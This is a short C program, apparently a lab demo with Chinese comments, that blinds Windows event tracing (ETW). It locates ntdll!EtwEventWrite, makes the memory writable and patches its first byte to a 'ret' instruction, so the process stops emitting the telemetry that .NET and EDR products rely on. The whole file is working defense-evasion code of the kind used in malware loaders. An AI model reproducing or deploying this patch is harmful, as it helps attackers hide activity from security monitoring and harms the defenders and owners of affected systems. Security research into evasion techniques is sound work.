// ETW 压制 demo：定位 ntdll!EtwEventWrite 并补丁为 ret（压制 .NET/EDR 常用遥测通道）
// 本地实验环境；判定配对见 NOTES.md
#include <windows.h>
#include <stdio.h>

int main(void) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    FARPROC fn = GetProcAddress(nt, "EtwEventWrite");
    if (!fn) { printf("[-] EtwEventWrite 未找到\n"); return 1; }
    DWORD old;
    if (!VirtualProtect(fn, 1, PAGE_READWRITE, &old)) { printf("[-] protect 失败\n"); return 2; }
    *(BYTE*)fn = 0xC3;                     // ret
    VirtualProtect(fn, 1, old, &old);
    printf("[+] EtwEventWrite @ %p 已补丁（ret）——本进程 ETW 事件静默\n", (void*)fn);
    return 0;
}
